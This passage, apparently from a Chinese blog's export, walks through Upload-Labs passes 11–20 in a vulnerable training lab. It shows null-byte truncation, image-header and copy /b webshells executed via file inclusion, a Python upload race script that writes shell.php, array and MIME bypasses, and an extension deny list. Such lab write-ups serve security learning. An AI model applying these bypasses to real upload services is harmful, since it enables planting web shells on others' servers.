文件成功上传，然后访问的时候记得改一下路径，因为文件名已经截断，所以访问路径由<code>..../upload/233.php�/5120201115205501.jpg</code>变为<code>..../upload/233.php</code>。完工</p>\n<h2 id=\"Pass-12\"><a href=\"#Pass-12\" class=\"headerlink\" title=\"Pass-12\"></a>Pass-12</h2><p>​    （windows环境）</p>\n<p>​    这题和上一题差不多一样，就是把<code>$_GET[&#39;save_path&#39;]</code>变成了<code>$_POST[&#39;save_path&#39;]</code>。由GET请求改成了POST请求，但是抓包修改的地方就不一样了，需要通过<strong>16进制修改</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115210935.png\"></p>\n<p>​    这里我命名为<code>233.phpa</code>是因为方便我在Hex表中找到这句话的位置和修改数据。<code>a</code>的16进制是<code>61</code>，需要改成截断的值：<code>00</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115211024.png\"></p>\n<p>​    上传成功以后打开图片，和上一题一样，需要把路径中已经截断的后面删除掉。完工</p>\n<h2 id=\"Pass-13\"><a href=\"#Pass-13\" class=\"headerlink\" title=\"Pass-13\"></a>Pass-13</h2><p>​    （Linux环境）</p>\n<p>​    源码中有关的函数解释：</p>\n<blockquote>\n<p><a href=\"https://segmentfault.com/a/1190000008305573\">PHP中pack、unpack的详细用法</a></p>\n<p><a href=\"https://www.php.net/manual/zh/function.fread.php\">fread()</a></p>\n<p><a href=\"https://www.php.net/fclose\">fclose()</a></p>\n<p><a href=\"https://www.php.net/intval\">intval()</a></p>\n</blockquote>\n<p>​    这道题和前面题目都不一样了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115211509.png\"></p>\n<p>​    题目说道需要<strong>上传图片马</strong>，然后使用<strong>文件包含漏洞</strong>进行测试，那么我们就先制作图片马。</p>\n<p>​    查看本题的提示<code>本pass检查图标内容开头2个字节！</code>，意思就是只检测文件前面两个字节的标识，贴一个<a href=\"https://blog.csdn.net/qq_37414405/article/details/84660148\">各种格式图片文件头标识分析</a>，所以这道题只用在上传的文件头部的两个字节处粘贴对应<strong>文件的头标识</strong>即可绕过检测。</p>\n<p>​    以GIF的文件头GIF89a 为例，创建文件notepad++编辑打开输入<code>GIF89a&lt;?php phpinfo(); ?&gt;</code>，后缀名无所谓了，因为题目只检测前两个字节即可上传。</p>\n<p>​    <strong>还有一种方法制作图片马</strong>：使用windows的<code>copy /b</code>指令，把两个文件进行<del>无缝</del>拼接，可以使用一张正常的图片加一个php文件进行拼接，即可正常上传。参考博客：<a href=\"https://blog.csdn.net/gaoshi66/article/details/83653143\">windows窗口命令——(copy/b)文件无缝拼接隐藏</a>。</p>\n<p>​    别忘了题目中说道了需要<strong>三种后缀都上传成功才算过关！</strong></p>\n<p>​    <strong>上传以后需要使用文件包含进行判定是否执行</strong>，先在新标签页面中打开图片，url中记下图片在服务器中的目录和名称（我的图片名称为8220201116071327.gif），点击<strong>2</strong>的链接进入<code>include.php</code>进行文件包含：网址输入<code>https://...../include.php?file=./upload/8220201116071327.gif</code>，找到php成功执行的页面。这里还有一个小知识点我学到的就是：<a href=\"https://www.cnblogs.com/xc90/articles/10257402.html\">路径中的’.’和’..’还有’./‘和’../‘都是什么意思</a>。完工</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116152417.png\"></p>\n<h2 id=\"Pass-14\"><a href=\"#Pass-14\" class=\"headerlink\" title=\"Pass-14\"></a>Pass-14</h2><p>​    （Linux环境）</p>\n<p>​    这题提示写道<code>本pass使用getimagesize()检查是否为图片文件！</code>，和上一题不一样的地方就是使用了<code>getimagesize()</code>函数，这个函数的官方文档<a href=\"https://www.php.net/manual/zh/function.getimagesize.php\">getimagesize()</a>，所以这道题就不能用13题的加<strong>文件的头标识</strong>方法绕过，这次要使用上一题中的<code>copy /b</code>指令用一张正常的图片进行拼接还是可以通过的。</p>\n<p>​    PS：听同学说<code>getimagesize()</code>不过是检测了前八个字节，不过我没试。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116155407.png\"></p>\n<p>​    因为是拼接的，所以要直接摸到图片最底部查看成功。完工</p>\n<h2 id=\"Pass-15\"><a href=\"#Pass-15\" class=\"headerlink\" title=\"Pass-15\"></a>Pass-15</h2><p>​    （Linux环境）</p>\n<p>​    13、14、15题都是对<strong>文件的头标识</strong>进行了检测，只不过第十四关使用的是getimagesize函数，第十五关使用的是exif_imagetype函数,函数返回值内容不一样而已。使用<code>copy /b</code>制作的图片马可以直接通过。</p>\n<p>​    网上搜集过来的资料</p>\n<blockquote>\n<p>png 文件头  89504E470D0A1A0A</p>\n<p>jpg 文件头 89504E470D0A1A0A</p>\n<p>gif 文件头 474946383961</p>\n</blockquote>\n<p>​    这几个字节应该都是够长的可以绕过这三个函数，所以验证了同学说的不同的函数检测的文件头长度是不一样的。完工</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    继续接着上一次的<code>Upload-labs</code>往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。</p>\n<p>​    在线靶机地址：</p>\n<ul>\n<li><a href=\"https://buuoj.cn/challenges#Upload-Labs-Linux\">linux环境</a></li>\n<li><a href=\"https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows\">windows环境</a></li>\n</ul>\n<h2 id=\"Pass-11\"><a href=\"#Pass-11\" class=\"headerlink\" title=\"Pass-11\"></a>Pass-11</h2><p>​    (这题使用了windows环境)</p>\n<p>​    源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = substr(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],strrpos(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>],<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;save_path&#x27;</span>].<span class=\"string\">&quot;/&quot;</span>.rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    分析代码发现是一个白名单验证，但是和之前不同点在于路径中使用了<code>$_GET[&#39;save_path&#39;]</code>，本题提示也写道</p>\n<p><code>本pass上传路径可控！</code>，就是通过这个GET变量控制上传路径。</p>\n<p>​    这一关的突破方法需要有一些条件：php版本需要低于<code>5.3.29</code>（我使用的是php版本5.3.17的本地靶机），另一个条件是<code>magic_quotes_gpc</code>需要为关闭状态。<code>magic_quotes_gpc</code>的作用官方文档写道：</p>\n<blockquote>\n<p><strong>Warning</strong> 本特性已自 PHP 5.3.0 起<em>废弃</em>并将自 PHP 5.4.0 起<em>移除</em>。</p>\n<p>​      为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。      当 magic_quotes 为 on，所有的 ‘ (单引号)、” (双引号)、\\（反斜杠）和 NUL’s 被一个反斜杠自动转义。     </p>\n</blockquote>\n<p>​    使用bp抓包并添加<code>0x00截断</code>，在GET请求中可以使用url编码的截断：<code>%00</code>。贴个自己参考的博客，<a href=\"https://www.cnblogs.com/milantgh/p/3612978.html\">截断上传原理剖析</a>。个人对于这道题的分析就是，上面文件的代码执行到第8行的时候，获取到了<code>$_GET[&#39;save_path&#39;]</code>变量的值，但是我们在这个变量后面添加了<code>0x00截断</code>，所以后面的代码便不会执行，文件也就不会被重命名。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115204109.png\"></p>\n<p>​    文件成功上传，然后访问的时候记得改一下路径，因为文件名已经截断，所以访问路径由<code>..../upload/233.php�/5120201115205501.jpg</code>变为<code>..../upload/233.php</code>。完工</p>\n<h2 id=\"Pass-12\"><a href=\"#Pass-12\" class=\"headerlink\" title=\"Pass-12\"></a>Pass-12</h2><p>​    （windows环境）</p>\n<p>​    这题和上一题差不多一样，就是把<code>$_GET[&#39;save_path&#39;]</code>变成了<code>$_POST[&#39;save_path&#39;]</code>。由GET请求改成了POST请求，但是抓包修改的地方就不一样了，需要通过<strong>16进制修改</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115210935.png\"></p>\n<p>​    这里我命名为<code>233.phpa</code>是因为方便我在Hex表中找到这句话的位置和修改数据。<code>a</code>的16进制是<code>61</code>，需要改成截断的值：<code>00</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115211024.png\"></p>\n<p>​    上传成功以后打开图片，和上一题一样，需要把路径中已经截断的后面删除掉。完工</p>\n<h2 id=\"Pass-13\"><a href=\"#Pass-13\" class=\"headerlink\" title=\"Pass-13\"></a>Pass-13</h2><p>​    （Linux环境）</p>\n<p>​    源码中有关的函数解释：</p>\n<blockquote>\n<p><a href=\"https://segmentfault.com/a/1190000008305573\">PHP中pack、unpack的详细用法</a></p>\n<p><a href=\"https://www.php.net/manual/zh/function.fread.php\">fread()</a></p>\n<p><a href=\"https://www.php.net/fclose\">fclose()</a></p>\n<p><a href=\"https://www.php.net/intval\">intval()</a></p>\n</blockquote>\n<p>​    这道题和前面题目都不一样了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201115211509.png\"></p>\n<p>​    题目说道需要<strong>上传图片马</strong>，然后使用<strong>文件包含漏洞</strong>进行测试，那么我们就先制作图片马。</p>\n<p>​    查看本题的提示<code>本pass检查图标内容开头2个字节！</code>，意思就是只检测文件前面两个字节的标识，贴一个<a href=\"https://blog.csdn.net/qq_37414405/article/details/84660148\">各种格式图片文件头标识分析</a>，所以这道题只用在上传的文件头部的两个字节处粘贴对应<strong>文件的头标识</strong>即可绕过检测。</p>\n<p>​    以GIF的文件头GIF89a 为例，创建文件notepad++编辑打开输入<code>GIF89a&lt;?php phpinfo(); ?&gt;</code>，后缀名无所谓了，因为题目只检测前两个字节即可上传。</p>\n<p>​    <strong>还有一种方法制作图片马</strong>：使用windows的<code>copy /b</code>指令，把两个文件进行<del>无缝</del>拼接，可以使用一张正常的图片加一个php文件进行拼接，即可正常上传。参考博客：<a href=\"https://blog.csdn.net/gaoshi66/article/details/83653143\">windows窗口命令——(copy/b)文件无缝拼接隐藏</a>。</p>\n<p>​    别忘了题目中说道了需要<strong>三种后缀都上传成功才算过关！</strong></p>\n<p>​    <strong>上传以后需要使用文件包含进行判定是否执行</strong>，先在新标签页面中打开图片，url中记下图片在服务器中的目录和名称（我的图片名称为8220201116071327.gif），点击<strong>2</strong>的链接进入<code>include.php</code>进行文件包含：网址输入<code>https://...../include.php?file=./upload/8220201116071327.gif</code>，找到php成功执行的页面。这里还有一个小知识点我学到的就是：<a href=\"https://www.cnblogs.com/xc90/articles/10257402.html\">路径中的’.’和’..’还有’./‘和’../‘都是什么意思</a>。完工</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116152417.png\"></p>\n<h2 id=\"Pass-14\"><a href=\"#Pass-14\" class=\"headerlink\" title=\"Pass-14\"></a>Pass-14</h2><p>​    （Linux环境）</p>\n<p>​    这题提示写道<code>本pass使用getimagesize()检查是否为图片文件！</code>，和上一题不一样的地方就是使用了<code>getimagesize()</code>函数，这个函数的官方文档<a href=\"https://www.php.net/manual/zh/function.getimagesize.php\">getimagesize()</a>，所以这道题就不能用13题的加<strong>文件的头标识</strong>方法绕过，这次要使用上一题中的<code>copy /b</code>指令用一张正常的图片进行拼接还是可以通过的。</p>\n<p>​    PS：听同学说<code>getimagesize()</code>不过是检测了前八个字节，不过我没试。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116155407.png\"></p>\n<p>​    因为是拼接的，所以要直接摸到图片最底部查看成功。完工</p>\n<h2 id=\"Pass-15\"><a href=\"#Pass-15\" class=\"headerlink\" title=\"Pass-15\"></a>Pass-15</h2><p>​    （Linux环境）</p>\n<p>​    13、14、15题都是对<strong>文件的头标识</strong>进行了检测，只不过第十四关使用的是getimagesize函数，第十五关使用的是exif_imagetype函数,函数返回值内容不一样而已。使用<code>copy /b</code>制作的图片马可以直接通过。</p>\n<p>​    网上搜集过来的资料</p>\n<blockquote>\n<p>png 文件头  89504E470D0A1A0A</p>\n<p>jpg 文件头 89504E470D0A1A0A</p>\n<p>gif 文件头 474946383961</p>\n</blockquote>\n<p>​    这几个字节应该都是够长的可以绕过这三个函数，所以验证了同学说的不同的函数检测的文件头长度是不一样的。完工</p>\n"},{"title":"Upload-Labs的最后几道题","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201119174619.jpg","date":"2020-11-19T00:47:19.000Z","_content":"\n\n## Pass-17\n\n​\t（windows环境，php版本5.2.17，题号是18题）\n\n源码：\n\n```php\n$is_upload = false;\n$msg = null;\n\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_name = $_FILES['upload_file']['name'];\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_ext = substr($file_name,strrpos($file_name,\".\")+1);\n    $upload_file = UPLOAD_PATH . '/' . $file_name;\n\n    if(move_uploaded_file($temp_file, $upload_file)){\n        if(in_array($file_ext,$ext_arr)){\n             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n             rename($upload_file, $img_path);\n             $is_upload = true;\n        }else{\n            $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n            unlink($upload_file);\n        }\n    }else{\n        $msg = '上传出错！';\n    }\n}\n```\n\n​\t思路和前面的一样，获取文件信息，移动文件到**upload**文件夹，第12行使用了白名单验证，多了第14行的`rename`函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了**上传竞争**，使用`python`脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码`<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>');?>`这段代码执行以后，会创建一个名为`shell.php`里面有一句`<?php phpinfo();?>`的文件。\n\n​\t脚本代码\n\n```python\n#coding=utf-8\nimport requests\nfrom multiprocessing import Pool\ndef CompeteUpload(list):\n    url=\"http://upload-labs/Pass-18/index.php\"   #上传页面\n    geturl=\"http://upload-labs/upload/233.php\"\t #访问上传文件\n    file={'upload_file':('233.php',\"<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>');?>\",'image/jpeg')}\n    data={'submit':'上传'}\n    r=requests.post(url=url,data=data,files=file)\n    #print \"test upload....\"\n    r1=requests.get(url=geturl)\n    if r1.status_code==200:\n        print (\"upload success!\")\nif __name__==\"__main__\":\n    pool = Pool(10)\n    pool.map(CompeteUpload, range(10000))\n    pool.close()\n    pool.join()\n```\n\n​\t第一次用python的我在这里知道了`pip`。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119090033.png)\n\n\n\n## Pass-18（失手）\n\n​\t18题失手了没有思路，如果使用`include.php`文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是`apache2.2.x的解析漏洞`，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。\n\n[Apache文件解析漏洞](https://blog.csdn.net/qq_32434307/article/details/79480316)\n\n[apache httpd多后缀解析漏洞复现](https://www.cnblogs.com/yuzly/p/11226377.html)\n\n​\t源码中还有一个可以突破的点是同样使用了**重命名函数**，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以~~先摸为敬~~。\n\n\n\n## Pass-19\n\n（windows环境，php5.2.17，magic_quotes_gpc=Off）\n\n源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = $_POST['save_name'];\n        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);\n\n        if(!in_array($file_ext,$deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) { \n                $is_upload = true;\n            }else{\n                $msg = '上传出错！';\n            }\n        }else{\n            $msg = '禁止保存为该类型文件！';\n        }\n\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t源码第七行使用了**POST**来接受文件的命名，前面有类似题的是使用了**0x00截断上传**，后面也同样是`move_uploaded_file`移动文件的函数，还使用了黑名单验证，方法就很明确，使用**截断上传**。别忘了截断上传需要的特定条件：php版本需要低于`5.3.29`、`magic_quotes_gpc`需要为关闭状态。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119164220.png)\n\n​\t同样是命名为`phpa`方便在十六进制表里修改为`00`\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119162729.png)\n\n​\t打开图片把url链接`http://upload-labs/upload/upload-19.php�`修改一下即可。完工\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119164458.png)\n\n​\t其实这道题还有一个思路，因为题目使用了**黑名单验证**，分析源码没有设置大小写过滤，所以也可以使用大小写方法通过如`Php`，不演示了。\n\n\n\n## Pass-20\n\n（LInux环境，php7.2.21）\n\n源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif(!empty($_FILES['upload_file'])){\n    //检查MIME\n    $allow_type = array('image/jpeg','image/png','image/gif');\n    if(!in_array($_FILES['upload_file']['type'],$allow_type)){\n        $msg = \"禁止上传该类型文件!\";\n    }else{\n        //检查文件名\n        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];\n        if (!is_array($file)) {\n            $file = explode('.', strtolower($file));\n        }\n\n        $ext = end($file);\n        $allow_suffix = array('jpg','png','gif');\n        if (!in_array($ext, $allow_suffix)) {\n            $msg = \"禁止上传该后缀文件!\";\n        }else{\n            $file_name = reset($file) . '.' . $file[count($file) - 1];\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $msg = \"文件上传成功！\";\n                $is_upload = true;\n            } else {\n                $msg = \"文件上传失败！\";\n            }\n        }\n    }\n}else{\n    $msg = \"请选择要上传的文件！\";\n}\n```\n\n​\t这道题使用了`MIME`验证和白名单验证。先看第10行使用了`三目运算符`判断`$_POST['save_name']`是否为空，若为空则执行`:`前获取上传文件的名称，若不为空则获取POST中的`save_name`。第11行使用了`is_array`函数判断是否是一个数组，然后使用`explode`截断文件名转换小写并返回数组。也就是说，如果我们POST中的`save_name`是个数组的就可以跳过11行的判断。15行使用`end`函数获取数组中的最后一个元素用于后缀验证。20行把文件名进行拼接：数组**第一个**元素+数组元素**总数-1**的那个元素。\n\n所以我们可以构造一个这样的数组用于绕过：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119170734.png)\n\n​\t数组[2]用于绕过白名单，文件名为：`数组[0].数组[1]`，但是数组[1]是空的所以只剩下`数组[0].`（后面有个点）\n\n​\t别忘了还要绕过**MIME**\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119172340.png)\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119172415.png)\n\n完工\n\n## 最后\n\n​\tUpload labs的20道题大部分完成了，有两道题没完成，但是也学到了不少东西，这些天再抽空写一个总结吧。射射观看。","source":"_posts/Upload-Labs5.md","raw":"---\ntitle: Upload-Labs的最后几道题\ncategories:\n- DROPS\ntags:\n- 文件上传漏洞\ncover: 'https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201119174619.jpg'\ndate: 2020-11-19 08:47:19\n---\n\n\n## Pass-17\n\n​\t（windows环境，php版本5.2.17，题号是18题）\n\n源码：\n\n```php\n$is_upload = false;\n$msg = null;\n\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_name = $_FILES['upload_file']['name'];\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_ext = substr($file_name,strrpos($file_name,\".\")+1);\n    $upload_file = UPLOAD_PATH . '/' . $file_name;\n\n    if(move_uploaded_file($temp_file, $upload_file)){\n        if(in_array($file_ext,$ext_arr)){\n             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n             rename($upload_file, $img_path);\n             $is_upload = true;\n        }else{\n            $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n            unlink($upload_file);\n        }\n    }else{\n        $msg = '上传出错！';\n    }\n}\n```\n\n​\t思路和前面的一样，获取文件信息，移动文件到**upload**文件夹，第12行使用了白名单验证，多了第14行的`rename`函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了**上传竞争**，使用`python`脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码`<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>');?>`这段代码执行以后，会创建一个名为`shell.php`里面有一句`<?php phpinfo();?>`的文件。\n\n​\t脚本代码\n\n```python\n#coding=utf-8\nimport requests\nfrom multiprocessing import Pool\ndef CompeteUpload(list):\n    url=\"http://upload-labs/Pass-18/index.php\"   #上传页面\n    geturl=\"http://upload-labs/upload/233.php\"\t #访问上传文件\n    file={'upload_file':('233.php',\"<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>');?>\",'image/jpeg')}\n    data={'submit':'上传'}\n    r=requests.post(url=url,data=data,files=file)\n    #print \"test upload....\"\n    r1=requests.get(url=geturl)\n    if r1.status_code==200:\n        print (\"upload success!\")\nif __name__==\"__main__\":\n    pool = Pool(10)\n    pool.map(CompeteUpload, range(10000))\n    pool.close()\n    pool.join()\n```\n\n​\t第一次用python的我在这里知道了`pip`。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119090033.png)\n\n\n\n## Pass-18（失手）\n\n​\t18题失手了没有思路，如果使用`include.php`文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是`apache2.2.x的解析漏洞`，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。\n\n[Apache文件解析漏洞](https://blog.csdn.net/qq_32434307/article/details/79480316)\n\n[apache httpd多后缀解析漏洞复现](https://www.cnblogs.com/yuzly/p/11226377.html)\n\n​\t源码中还有一个可以突破的点是同样使用了**重命名函数**，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以~~先摸为敬~~。\n\n\n\n## Pass-19\n\n（windows环境，php5.2.17，magic_quotes_gpc=Off）\n\n源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = $_POST['save_name'];\n        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);\n\n        if(!in_array($file_ext,$deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) { \n                $is_upload = true;\n            }else{\n                $msg = '上传出错！';\n            }\n        }else{\n            $msg = '禁止保存为该类型文件！';\n        }\n\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t源码第七行使用了**POST**来接受文件的命名，前面有类似题的是使用了**0x00截断上传**，后面也同样是`move_uploaded_file`移动文件的函数，还使用了黑名单验证，方法就很明确，使用**截断上传**。别忘了截断上传需要的特定条件：php版本需要低于`5.3.29`、`magic_quotes_gpc`需要为关闭状态。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119164220.png)\n\n​\t同样是命名为`phpa`方便在十六进制表里修改为`00`\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119162729.png)\n\n​\t打开图片把url链接`http://upload-labs/upload/upload-19.php�`修改一下即可。完工\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119164458.png)\n\n​\t其实这道题还有一个思路，因为题目使用了**黑名单验证**，分析源码没有设置大小写过滤，所以也可以使用大小写方法通过如`Php`，不演示了。\n\n\n\n## Pass-20\n\n（LInux环境，php7.2.21）\n\n源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif(!empty($_FILES['upload_file'])){\n    //检查MIME\n    $allow_type = array('image/jpeg','image/png','image/gif');\n    if(!in_array($_FILES['upload_file']['type'],$allow_type)){\n        $msg = \"禁止上传该类型文件!\";\n    }else{\n        //检查文件名\n        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];\n        if (!is_array($file)) {\n            $file = explode('.', strtolower($file));\n        }\n\n        $ext = end($file);\n        $allow_suffix = array('jpg','png','gif');\n        if (!in_array($ext, $allow_suffix)) {\n            $msg = \"禁止上传该后缀文件!\";\n        }else{\n            $file_name = reset($file) . '.' . $file[count($file) - 1];\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $msg = \"文件上传成功！\";\n                $is_upload = true;\n            } else {\n                $msg = \"文件上传失败！\";\n            }\n        }\n    }\n}else{\n    $msg = 